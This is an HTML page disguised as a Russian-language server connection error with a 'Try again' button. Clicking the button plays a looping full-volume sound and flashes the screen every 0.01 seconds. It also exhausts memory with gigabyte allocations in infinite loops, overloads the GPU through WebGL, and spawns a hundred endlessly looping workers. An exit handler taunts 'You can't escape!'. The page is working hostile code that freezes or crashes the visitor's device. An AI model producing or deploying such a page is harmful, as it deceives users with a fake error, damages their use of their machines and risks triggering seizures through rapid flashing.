<!DOCTYPE html>
<html>
<head>
  <style>
    #trapButton {
      position: fixed;
      top: 60%;
      left: 50%;
      transform: translate(-50%, -50%);
      padding: 2rem 4rem;
      font-size: 2.5rem;
      font-family: 'Arial', sans-serif;
      background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
      color: white;
      border: none;
      border-radius: 15px;
      cursor: pointer;
      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
      transition: all 0.3s ease;
      z-index: 9999;
    }

    #trapButton:hover {
      transform: translate(-50%, -55%);
      box-shadow: 0 15px 30px rgba(0,0,0,0.3);
      background: linear-gradient(45deg, #ff8787, #66e0d9);
    }

    body {
      background: #1a1a2e;
      margin: 0;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    h1 {
      color: white;
      font-family: 'Arial', sans-serif;
      font-size: 3rem;
      text-align: center;
      margin-bottom: 2rem;
      z-index: 9999;
    }
  </style>
</head>
<body>
  <h1>Ошибка подключения к серверу</h1>
  <button id="trapButton">Попробуйте ещё раз</button>
  <audio id="nukeSound" src="sound.mp3" preload="auto"></audio>

  <script>
    const trigger = document.getElementById('trapButton');
    const audio = document.getElementById('nukeSound');
    
    const audioCtx = new AudioContext();
    let audioBuffer = null;

    async function loadAudio() {
      try {
        const response = await fetch('sound.mp3');
        const arrayBuffer = await response.arrayBuffer();
        audioBuffer = await audioCtx.decodeAudioData(arrayBuffer);
      } catch (e) {
        console.error('Ошибка загрузки аудио:', e);
      }
    }

    function playSound() {
      if (audioCtx.state === 'suspended') {
        audioCtx.resume();
      }

      function createSoundSource() {
        if (audioBuffer) {
          const source = audioCtx.createBufferSource();
          source.buffer = audioBuffer;

          // Подключение напрямую без обработки
          source.connect(audioCtx.destination);

          source.start(0);

          // Повторение звука
          source.onended = () => {
            createSoundSource();
          };

          // Резервное воспроизведение
          audio.volume = 1.0;
          audio.loop = true;
          audio.play().catch(() => {});
        } else {
          audio.volume = 1.0;
          audio.loop = true;
          audio.play().catch(() => {});
        }
      }
      createSoundSource();
    }

    loadAudio();

    trigger.onclick = () => {
      playSound();
      trigger.style.display = 'none';
      document.body.style.animation = 'flash 0.01s infinite';

      const extremeLag = () => {
        while(true) {
          const arrays = [];
          for(let j = 0; j < 10; j++) {
            const hugeArray = new ArrayBuffer(1024 * 1024 * 1024);
            const view = new Uint32Array(hugeArray);
            for(let i = 0; i < view.length; i++) {
              view[i] = Math.random() * Math.sin(Date.now()) * Math.tan(i) * 0xFFFFFFFF;
              view[i] *= Math.pow(Math.cos(view[i]), Math.random());
            }
            arrays.push(view);
          }
        }
      };

      const gpuOverload = () => {
        const canvas = document.createElement('canvas');
        canvas.width = 32767;
        canvas.height = 32767;
        document.body.appendChild(canvas);
        const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"});
        
        if (gl) {
          for(let t = 0; t < 10; t++) {
            const texture = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, texture);
            gl.texImage2D(
              gl.TEXTURE_2D,
              0,
              gl.RGBA32F,
              32767,
              32767,
              0,
              gl.RGBA,
              gl.FLOAT,
              null
            );
          }

          const render = () => {
            gl.clear(gl.COLOR_BUFFER_BIT);
            for(let i = 0; i < 5000; i++) {
              gl.drawArrays(gl.TRIANGLES, 0, 32767 * 32767);
            }
            requestAnimationFrame(render);
          };
          render();
        }
      };

      for(let i = 0; i < 200; i++) {
        setTimeout(extremeLag, 0);
        setTimeout(gpuOverload, 0);
      }

      for(let i = 0; i < 100; i++) {
        new Worker(URL.createObjectURL(new Blob([`
          while(true) {
            let arr = new Float64Array(200000000);
            for(let i = 0; i < arr.length; i++) {
              arr[i] = Math.random() * Math.pow(Math.sin(Math.tan(i)), 2);
              arr[i] *= Math.log(arr[i] + 1) * Math.sqrt(i);
            }
          }
        `])));
      }

      window.onbeforeunload = () => {
        extremeLag();
        return "You can't escape!";
      };
    };

    document.head.innerHTML += `
      <style>
        @keyframes flash {
          0% { background: #ff6b6b; }
          33% { background: #4ecdc4; }
          66% { background: #45b7d1; }
          100% { background: #ff6b6b; }
        }
      </style>
    `;
  </script>
</body>
</html>
